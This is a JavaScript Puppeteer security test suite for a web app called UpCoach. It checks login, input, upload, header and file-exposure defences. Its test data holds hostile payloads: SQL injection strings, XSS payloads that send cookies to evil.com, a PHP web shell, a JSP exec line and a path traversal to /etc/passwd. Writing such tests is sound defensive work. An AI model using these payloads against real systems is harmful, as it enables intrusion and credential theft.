const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');

class SecurityTestSuite {
  constructor(baseUrl = 'http://localhost:8000') {
    this.baseUrl = baseUrl;
    this.browser = null;
    this.page = null;
    this.results = {
      vulnerabilities: [],
      passed: 0,
      failed: 0,
      warnings: 0
    };
  }

  async setup() {
    this.browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    this.page = await this.browser.newPage();

    // Set security headers for testing
    await this.page.setExtraHTTPHeaders({
      'User-Agent': 'UpCoach-Security-Scanner/1.0'
    });

    // Enable console logging
    this.page.on('console', msg => {
      if (msg.type() === 'error') {
        console.log('Console Error:', msg.text());
      }
    });

    // Monitor failed requests
    this.page.on('requestfailed', request => {
      console.log('Failed Request:', request.url(), request.failure());
    });
  }

  async teardown() {
    if (this.browser) {
      await this.browser.close();
    }
  }

  // Authentication Security Tests
  async testAuthenticationSecurity() {
    console.log('🔐 Testing Authentication Security...');

    await this.testSQLInjectionInLogin();
    await this.testXSSInLogin();
    await this.testBruteForceProtection();
    await this.testSessionManagement();
    await this.testPasswordPolicy();
    await this.testTwoFactorBypass();
  }

  async testSQLInjectionInLogin() {
    const sqlInjectionPayloads = [
      "' OR '1'='1' --",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'/*",
      "' OR 1=1#"
    ];

    for (const payload of sqlInjectionPayloads) {
      try {
        await this.page.goto(`${this.baseUrl}/login`);
        await this.page.type('[name="email"]', payload);
        await this.page.type('[name="password"]', 'test');
        await this.page.click('[type="submit"]');

        await this.page.waitForSelector('.error-message, .success-message', { timeout: 5000 });

        const currentUrl = this.page.url();
        const errorMessage = await this.page.$eval('.error-message', el => el.textContent).catch(() => null);

        if (currentUrl.includes('/dashboard') || !errorMessage) {
          this.addVulnerability('SQL Injection', 'HIGH', `SQL injection payload "${payload}" bypassed authentication`, '/login');
        } else {
          this.passed++;
        }
      } catch (error) {
        this.addVulnerability('SQL Injection Test Error', 'MEDIUM', `Error testing SQL injection: ${error.message}`, '/login');
      }
    }
  }

  async testXSSInLogin() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">'
    ];

    for (const payload of xssPayloads) {
      try {
        await this.page.goto(`${this.baseUrl}/login`);
        await this.page.type('[name="email"]', payload);
        await this.page.click('[type="submit"]');

        // Check if XSS payload executed
        const dialogPromise = new Promise(resolve => {
          this.page.once('dialog', async dialog => {
            await dialog.dismiss();
            resolve(true);
          });
          setTimeout(() => resolve(false), 2000);
        });

        const xssTriggered = await dialogPromise;

        if (xssTriggered) {
          this.addVulnerability('Cross-Site Scripting (XSS)', 'HIGH', `XSS payload "${payload}" executed successfully`, '/login');
        } else {
          this.passed++;
        }
      } catch (error) {
        this.addVulnerability('XSS Test Error', 'MEDIUM', `Error testing XSS: ${error.message}`, '/login');
      }
    }
  }

  async testBruteForceProtection() {
    const attempts = 10;
    let blockedAfter = null;

    for (let i = 1; i <= attempts; i++) {
      try {
        await this.page.goto(`${this.baseUrl}/login`);
        await this.page.type('[name="email"]', 'test@example.com');
        await this.page.type('[name="password"]', `wrong-password-${i}`);
        await this.page.click('[type="submit"]');

        await this.page.waitForTimeout(500);

        const errorMessage = await this.page.$eval('.error-message', el => el.textContent).catch(() => '');

        if (errorMessage.includes('too many attempts') || errorMessage.includes('temporarily blocked')) {
          blockedAfter = i;
          break;
        }
      } catch (error) {
        console.log(`Brute force test attempt ${i} failed:`, error.message);
      }
    }

    if (!blockedAfter) {
      this.addVulnerability('Brute Force Protection', 'HIGH', 'No rate limiting detected after 10 failed login attempts', '/login');
    } else if (blockedAfter > 5) {
      this.addVulnerability('Weak Brute Force Protection', 'MEDIUM', `Account locked only after ${blockedAfter} attempts`, '/login');
    } else {
      this.passed++;
    }
  }

  async testSessionManagement() {
    try {
      // Test session without login
      await this.page.goto(`${this.baseUrl}/dashboard`);
      const currentUrl = this.page.url();

      if (currentUrl.includes('/dashboard')) {
        this.addVulnerability('Session Management', 'HIGH', 'Dashboard accessible without authentication', '/dashboard');
      } else {
        this.passed++;
      }

      // Test session fixation
      await this.page.goto(`${this.baseUrl}/login`);
      const sessionIdBefore = await this.page.evaluate(() => document.cookie);

      // Simulate login (using valid test credentials)
      await this.page.type('[name="email"]', 'test@example.com');
      await this.page.type('[name="password"]', 'validpassword');
      await this.page.click('[type="submit"]');

      await this.page.waitForTimeout(2000);

      const sessionIdAfter = await this.page.evaluate(() => document.cookie);

      if (sessionIdBefore === sessionIdAfter && sessionIdBefore !== '') {
        this.addVulnerability('Session Fixation', 'MEDIUM', 'Session ID not regenerated after login', '/login');
      } else {
        this.passed++;
      }
    } catch (error) {
      this.addVulnerability('Session Management Test Error', 'LOW', `Error testing session management: ${error.message}`, '/dashboard');
    }
  }

  async testPasswordPolicy() {
    const weakPasswords = [
      '123',
      'password',
      'admin',
      'test',
      '12345678'
    ];

    for (const password of weakPasswords) {
      try {
        await this.page.goto(`${this.baseUrl}/register`);
        await this.page.type('[name="email"]', `test${Date.now()}@example.com`);
        await this.page.type('[name="password"]', password);
        await this.page.type('[name="firstName"]', 'Test');
        await this.page.type('[name="lastName"]', 'User');
        await this.page.click('[type="submit"]');

        await this.page.waitForTimeout(1000);

        const errorMessage = await this.page.$eval('.error-message, .field-error', el => el.textContent).catch(() => '');

        if (!errorMessage.includes('password') && !errorMessage.includes('weak')) {
          this.addVulnerability('Weak Password Policy', 'MEDIUM', `Weak password "${password}" accepted`, '/register');
        } else {
          this.passed++;
        }
      } catch (error) {
        console.log(`Password policy test failed for "${password}":`, error.message);
      }
    }
  }

  async testTwoFactorBypass() {
    try {
      // Test direct access to protected pages after partial authentication
      await this.page.goto(`${this.baseUrl}/settings/security`);
      const currentUrl = this.page.url();

      if (currentUrl.includes('/settings')) {
        this.addVulnerability('2FA Bypass', 'HIGH', 'Security settings accessible without 2FA verification', '/settings/security');
      } else {
        this.passed++;
      }
    } catch (error) {
      this.addVulnerability('2FA Test Error', 'LOW', `Error testing 2FA bypass: ${error.message}`, '/settings/security');
    }
  }

  // Input Validation Security Tests
  async testInputValidationSecurity() {
    console.log('🛡️ Testing Input Validation Security...');

    await this.testXSSInUserInputs();
    await this.testCSRFProtection();
    await this.testFileUploadSecurity();
    await this.testAPIInputValidation();
  }

  async testXSSInUserInputs() {
    const xssPayloads = [
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<svg onload="alert(\'XSS\')"></svg>',
      '"><script>fetch("http://evil.com", {method: "POST", body: document.cookie})</script>'
    ];

    const inputFields = [
      { page: '/profile', field: '[name="firstName"]', name: 'First Name' },
      { page: '/profile', field: '[name="lastName"]', name: 'Last Name' },
      { page: '/goals', field: '[name="title"]', name: 'Goal Title' },
      { page: '/goals', field: '[name="description"]', name: 'Goal Description' }
    ];

    for (const input of inputFields) {
      for (const payload of xssPayloads) {
        try {
          await this.page.goto(`${this.baseUrl}${input.page}`);
          await this.page.type(input.field, payload);
          await this.page.click('[type="submit"]');

          await this.page.waitForTimeout(1000);

          // Check if payload is reflected without encoding
          const pageContent = await this.page.content();
          if (pageContent.includes(payload.replace(/"/g, '&quot;')) === false && pageContent.includes(payload)) {
            this.addVulnerability('Stored XSS', 'HIGH', `XSS payload in ${input.name} field is not properly encoded`, input.page);
          } else {
            this.passed++;
          }
        } catch (error) {
          console.log(`XSS input validation test failed for ${input.name}:`, error.message);
        }
      }
    }
  }

  async testCSRFProtection() {
    try {
      // Test if CSRF tokens are present in forms
      await this.page.goto(`${this.baseUrl}/profile`);
      const csrfToken = await this.page.$('[name="_csrf"], [name="csrf_token"], [name="_token"]');

      if (!csrfToken) {
        this.addVulnerability('CSRF Protection', 'HIGH', 'No CSRF token found in forms', '/profile');
      } else {
        this.passed++;
      }

      // Test CSRF protection by making request without token
      const response = await this.page.evaluate(async (baseUrl) => {
        try {
          const response = await fetch(`${baseUrl}/api/profile`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ firstName: 'Hacked' })
          });
          return response.status;
        } catch (error) {
          return null;
        }
      }, this.baseUrl);

      if (response === 200) {
        this.addVulnerability('CSRF Protection', 'HIGH', 'API accepts requests without CSRF protection', '/api/profile');
      } else {
        this.passed++;
      }
    } catch (error) {
      this.addVulnerability('CSRF Test Error', 'LOW', `Error testing CSRF protection: ${error.message}`, '/profile');
    }
  }

  async testFileUploadSecurity() {
    const maliciousFiles = [
      { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/php' },
      { name: 'test.jsp', content: '<% Runtime.getRuntime().exec("cmd"); %>', type: 'application/jsp' },
      { name: 'test.html', content: '<script>alert("XSS")</script>', type: 'text/html' }
    ];

    for (const file of maliciousFiles) {
      try {
        await this.page.goto(`${this.baseUrl}/profile`);

        // Create a temporary file for testing
        const tempFilePath = path.join(__dirname, 'temp', file.name);
        fs.writeFileSync(tempFilePath, file.content);

        const fileInput = await this.page.$('[type="file"]');
        if (fileInput) {
          await fileInput.uploadFile(tempFilePath);
          await this.page.click('[type="submit"]');

          await this.page.waitForTimeout(2000);

          const errorMessage = await this.page.$eval('.error-message', el => el.textContent).catch(() => '');

          if (!errorMessage.includes('file type') && !errorMessage.includes('not allowed')) {
            this.addVulnerability('File Upload Security', 'HIGH', `Malicious file type ${file.name} was accepted`, '/profile');
          } else {
            this.passed++;
          }

          // Cleanup
          fs.unlinkSync(tempFilePath);
        }
      } catch (error) {
        console.log(`File upload test failed for ${file.name}:`, error.message);
      }
    }
  }

  async testAPIInputValidation() {
    const maliciousPayloads = [
      { data: { id: '../../../etc/passwd' }, test: 'Path Traversal' },
      { data: { command: 'ls -la' }, test: 'Command Injection' },
      { data: { query: 'SELECT * FROM users' }, test: 'SQL Injection in JSON' },
      { data: { script: '<script>alert("XSS")</script>' }, test: 'XSS in JSON' }
    ];

    const apiEndpoints = [
      '/api/goals',
      '/api/habits',
      '/api/profile',
      '/api/progress'
    ];

    for (const endpoint of apiEndpoints) {
      for (const payload of maliciousPayloads) {
        try {
          const response = await this.page.evaluate(async (baseUrl, endpoint, data) => {
            try {
              const response = await fetch(`${baseUrl}${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
              });
              return {
                status: response.status,
                text: await response.text()
              };
            } catch (error) {
              return { error: error.message };
            }
          }, this.baseUrl, endpoint, payload.data);

          if (response.status === 200 && !response.text.includes('error')) {
            this.addVulnerability('API Input Validation', 'MEDIUM', `${payload.test} payload accepted at ${endpoint}`, endpoint);
          } else {
            this.passed++;
          }
        } catch (error) {
          console.log(`API input validation test failed for ${endpoint}:`, error.message);
        }
      }
    }
  }

  // Security Headers Tests
  async testSecurityHeaders() {
    console.log('🔒 Testing Security Headers...');

    try {
      const response = await this.page.goto(this.baseUrl);
      const headers = response.headers();

      const requiredHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'strict-transport-security',
        'content-security-policy'
      ];

      for (const header of requiredHeaders) {
        if (!headers[header]) {
          this.addVulnerability('Missing Security Header', 'MEDIUM', `Missing ${header} header`, '/');
        } else {
          this.passed++;
        }
      }

      // Check specific header values
      if (headers['x-frame-options'] && !headers['x-frame-options'].includes('DENY') && !headers['x-frame-options'].includes('SAMEORIGIN')) {
        this.addVulnerability('Weak X-Frame-Options', 'MEDIUM', 'X-Frame-Options not set to DENY or SAMEORIGIN', '/');
      }

      if (headers['x-content-type-options'] && !headers['x-content-type-options'].includes('nosniff')) {
        this.addVulnerability('Weak X-Content-Type-Options', 'LOW', 'X-Content-Type-Options not set to nosniff', '/');
      }
    } catch (error) {
      this.addVulnerability('Security Headers Test Error', 'LOW', `Error testing security headers: ${error.message}`, '/');
    }
  }

  // Information Disclosure Tests
  async testInformationDisclosure() {
    console.log('🔍 Testing Information Disclosure...');

    const sensitivePaths = [
      '/.env',
      '/config.php',
      '/web.config',
      '/admin',
      '/api/docs',
      '/swagger',
      '/.git/config',
      '/package.json',
      '/composer.json'
    ];

    for (const path of sensitivePaths) {
      try {
        const response = await this.page.goto(`${this.baseUrl}${path}`, { waitUntil: 'networkidle0' });

        if (response.status() === 200) {
          const content = await this.page.content();
          if (content.length > 100) { // Ignore empty responses
            this.addVulnerability('Information Disclosure', 'MEDIUM', `Sensitive file accessible: ${path}`, path);
          }
        } else {
          this.passed++;
        }
      } catch (error) {
        this.passed++; // Path not accessible, which is good
      }
    }
  }

  // Utility Methods
  addVulnerability(type, severity, description, location) {
    this.results.vulnerabilities.push({
      type,
      severity,
      description,
      location,
      timestamp: new Date().toISOString()
    });

    this.failed++;
    console.log(`❌ ${severity} - ${type}: ${description} (${location})`);
  }

  async runAllTests() {
    console.log('🚀 Starting UpCoach Security Test Suite...\n');

    try {
      await this.setup();

      await this.testAuthenticationSecurity();
      await this.testInputValidationSecurity();
      await this.testSecurityHeaders();
      await this.testInformationDisclosure();

      console.log('\n📊 Security Test Results:');
      console.log(`✅ Passed: ${this.results.passed}`);
      console.log(`❌ Failed: ${this.results.failed}`);
      console.log(`⚠️  Vulnerabilities Found: ${this.results.vulnerabilities.length}`);

      // Generate report
      this.generateReport();

    } catch (error) {
      console.error('Security test suite failed:', error);
    } finally {
      await this.teardown();
    }

    return this.results;
  }

  generateReport() {
    const report = {
      summary: {
        passed: this.results.passed,
        failed: this.results.failed,
        totalVulnerabilities: this.results.vulnerabilities.length,
        highSeverity: this.results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
        mediumSeverity: this.results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
        lowSeverity: this.results.vulnerabilities.filter(v => v.severity === 'LOW').length
      },
      vulnerabilities: this.results.vulnerabilities,
      timestamp: new Date().toISOString(),
      testSuite: 'UpCoach Security Test Suite v1.0'
    };

    const reportPath = path.join(__dirname, 'security-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

    console.log(`\n📄 Security report saved to: ${reportPath}`);

    // Generate HTML report
    this.generateHTMLReport(report);
  }

  generateHTMLReport(report) {
    const html = `
<!DOCTYPE html>
<html>
<head>
    <title>UpCoach Security Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        .header { border-bottom: 2px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .metric { padding: 20px; border-radius: 8px; text-align: center; }
        .metric.passed { background-color: #d4edda; border-left: 4px solid #28a745; }
        .metric.failed { background-color: #f8d7da; border-left: 4px solid #dc3545; }
        .metric.high { background-color: #f8d7da; border-left: 4px solid #dc3545; }
        .metric.medium { background-color: #fff3cd; border-left: 4px solid #ffc107; }
        .metric.low { background-color: #d1ecf1; border-left: 4px solid #17a2b8; }
        .vulnerabilities { margin-top: 30px; }
        .vulnerability { margin-bottom: 20px; padding: 15px; border-radius: 5px; border-left: 4px solid #ccc; }
        .vulnerability.HIGH { border-left-color: #dc3545; background-color: #f8d7da; }
        .vulnerability.MEDIUM { border-left-color: #ffc107; background-color: #fff3cd; }
        .vulnerability.LOW { border-left-color: #17a2b8; background-color: #d1ecf1; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 UpCoach Security Test Report</h1>
            <p>Generated on: ${new Date(report.timestamp).toLocaleString()}</p>
            <p>Test Suite: ${report.testSuite}</p>
        </div>

        <div class="summary">
            <div class="metric passed">
                <h3>${report.summary.passed}</h3>
                <p>Tests Passed</p>
            </div>
            <div class="metric failed">
                <h3>${report.summary.failed}</h3>
                <p>Tests Failed</p>
            </div>
            <div class="metric high">
                <h3>${report.summary.highSeverity}</h3>
                <p>High Risk</p>
            </div>
            <div class="metric medium">
                <h3>${report.summary.mediumSeverity}</h3>
                <p>Medium Risk</p>
            </div>
            <div class="metric low">
                <h3>${report.summary.lowSeverity}</h3>
                <p>Low Risk</p>
            </div>
        </div>

        <div class="vulnerabilities">
            <h2>🚨 Vulnerabilities Found</h2>
            ${report.vulnerabilities.map(vuln => `
                <div class="vulnerability ${vuln.severity}">
                    <h3>${vuln.type} - ${vuln.severity}</h3>
                    <p><strong>Description:</strong> ${vuln.description}</p>
                    <p><strong>Location:</strong> ${vuln.location}</p>
                    <p><strong>Found:</strong> ${new Date(vuln.timestamp).toLocaleString()}</p>
                </div>
            `).join('')}
        </div>

        <div class="recommendations">
            <h2>🛡️ Security Recommendations</h2>
            <ul>
                <li>Implement proper input validation and sanitization</li>
                <li>Add CSRF protection to all state-changing operations</li>
                <li>Configure security headers (CSP, HSTS, X-Frame-Options)</li>
                <li>Implement rate limiting for authentication endpoints</li>
                <li>Use parameterized queries to prevent SQL injection</li>
                <li>Validate and sanitize file uploads</li>
                <li>Implement proper session management</li>
                <li>Regular security audits and penetration testing</li>
            </ul>
        </div>
    </div>
</body>
</html>
    `;

    const htmlReportPath = path.join(__dirname, 'security-report.html');
    fs.writeFileSync(htmlReportPath, html);
    console.log(`📄 HTML Security report saved to: ${htmlReportPath}`);
  }
}

// CLI execution
if (require.main === module) {
  const baseUrl = process.argv[2] || 'http://localhost:8000';
  const testSuite = new SecurityTestSuite(baseUrl);

  testSuite.runAllTests().then(results => {
    const exitCode = results.vulnerabilities.filter(v => v.severity === 'HIGH').length > 0 ? 1 : 0;
    process.exit(exitCode);
  }).catch(error => {
    console.error('Security test failed:', error);
    process.exit(1);
  });
}

module.exports = SecurityTestSuite;